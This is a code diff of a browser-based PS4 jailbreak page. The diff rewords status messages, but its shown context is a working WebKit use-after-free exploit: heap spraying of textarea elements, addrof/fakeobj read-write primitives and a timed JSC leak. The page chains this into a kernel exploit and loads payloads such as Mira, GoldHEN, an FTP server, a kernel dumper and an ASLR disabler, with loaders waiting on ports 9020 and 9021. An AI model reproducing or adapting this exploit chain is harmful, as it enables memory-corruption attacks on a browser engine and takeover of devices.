@@ -34,7 +34,6 @@ var g_jsview_butterfly = null;
 var g_message_heading_leak = null;
 var g_message_body_leak = null;
 
-var g_textarea_div_elem = null;
 var g_obj_str = {};
 
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
@@ -116,9 +115,9 @@ function setupRW() {
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	if(localStorage.autoExploit=="true")
-		debug_log("-> WebKit Exploit Complete.. Running Kernel Exploit !!");
+		debug_log("Running selected kernel exploit");
 	else
-		debug_log("-> WebKit Exploit Complete.. Run the Kernel Exploit to Jailbreak !!");
+		debug_log("Running selected kernel exploit");
 
 	/* Getting code execution */
 	/* ... */
@@ -129,87 +128,84 @@ function setupRW() {
 
 function toggle_payload(pld){
 	if(pld == "exploit"){
-		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
+		document.getElementById("progress").innerHTML="Selected New Exploit, please wait!";
 		preloadScripts(['jb/jb.js']);
 	}else if(pld == "exploit_old"){
-		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
+		document.getElementById("progress").innerHTML="Selected Old Exploit, please wait!";
 		preloadScripts(['jb/oldjb.js']);
 	}else if(pld == "binloader"){
-		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9020..";
+		document.getElementById("progress").innerHTML="Bin Loader is waiting payloads at port 9020!";
 		preloadScripts(['payloads/preloader.js', 'payloads/loader.js']);
 	}else if(pld == "mira75X"){
-		document.getElementById("progress").innerHTML="Loading MIRA.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading Mira, please wait!";
 		if(fw=="755"){
 			preloadScripts(['payloads/preloader.js', 'payloads/mira'+fw+'.js', 'payloads/loader.js']);
 		}else{
 			preloadScripts(['payloads/preloader'+fw+'.js', 'payloads/mira'+fw+'.js', 'payloads/loader.js']);	
 		}
 	}else if(pld == "mira2b"){
-		document.getElementById("progress").innerHTML="Loading MIRA + SPOOF.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading Mira + Spoofing, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/mira2b.js', 'payloads/loader.js']);
 	}else if(pld == "ftp"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Loaded.. Access at port 1337.."; }, 7000);
+		setTimeout(function(){document.getElementById("progress").innerHTML="FTP loaded, connect at port 1337"; }, 7000);
 		preloadScripts(['payloads/preloader.js', 'payloads/ftp.js', 'payloads/loader.js']);
 	}else if(pld == "app2usb"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/app2usb.js', 'payloads/loader.js']);
 	}else if(pld == "disableupdates"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/disableupdates.js', 'payloads/loader.js']);
 	}else if(pld == "enableupdates"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/enableupdates.js', 'payloads/loader.js']);
 	}else if(pld == "backup"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/backup.js', 'payloads/loader.js']);
 	}else if(pld == "restore"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/restore.js', 'payloads/loader.js']);
 	}else if(pld == "rifrenamer"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/rifrenamer.js', 'payloads/loader.js']);
 	}else if(pld == "todex"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/todex.js', 'payloads/loader.js']);
 	}else if(pld == "dumper"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/dumper.js', 'payloads/loader.js']);
 	}else if(pld == "disableaslr"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/disableaslr.js', 'payloads/loader.js']);
 	}else if(pld == "kerneldumper"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/kerneldumper.js', 'payloads/loader.js']);
 	}else if(pld == "kernelclock"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/kernelclock.js', 'payloads/loader.js']);
 	}else if(pld == "fancontrol"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/fancontrol.js', 'payloads/loader.js']);
 	}else if(pld == "enablebrowser"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/enablebrowser.js', 'payloads/loader.js']);
 	}else if(pld == "historyblocker"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/historyblocker.js', 'payloads/loader.js']);
 	}else if(pld == "exitidu"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/exitidu.js', 'payloads/loader.js']);
 	}else if(pld == "ps4debug"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/ps4debug.js', 'payloads/loader.js']);
 	}else if(pld == "goldhen"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		if(fw=="755"){
 			preloadScripts(['payloads/preloader.js', 'payloads/goldhen'+fw+'.js', 'payloads/loader.js']);
 		}else{
 			preloadScripts(['payloads/preloader'+fw+'.js', 'payloads/goldhen'+fw+'.js', 'payloads/loader.js']);	
 		}
-	}else if(pld == "goldhenold"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
-		preloadScripts(['payloads/preloader.js', 'payloads/goldhen.js', 'payloads/loader.js']);
 	}else if(pld == "webrte"){
-		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		document.getElementById("progress").innerHTML="Loading selected payload, please wait!";
 		preloadScripts(['payloads/preloader.js', 'payloads/webrte.js', 'payloads/loader.js']);
 	}
 	if(window.postPayload)
@@ -221,9 +217,9 @@ function toggle_payload(pld){
 function payload_finished(payload)
 {
 	if(payload == "binloader"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021"; }, 7000);
+		setTimeout(function(){document.getElementById("progress").innerHTML="Bin Loader is waiting payloads at port 9021!"; }, 7000);
 	} else if(payload != "exploit" && payload != "exploit_old"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.55 Payload Loaded Succesfully !!"; }, 7000);
+		setTimeout(function(){document.getElementById("progress").innerHTML="Full JB loaded succesfully, load you payload!"; }, 7000);
 	}
 }
 
@@ -413,7 +409,7 @@ function confuseTargetObjRound1() {
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
 	 * the next 5s
 	 */
-	setTimeout(leakJSC, 6000);
+	setTimeout(function(){leakJSC();}, 6000);
 }
 
 function handle2() {
@@ -518,7 +514,7 @@ function prepareUAF() {
 function sprayHTMLTextArea() {
 	debug_log("-> Spraying HTMLTextareaElement ...");
 
-	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
+	let textarea_div_elem = window.xyu = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
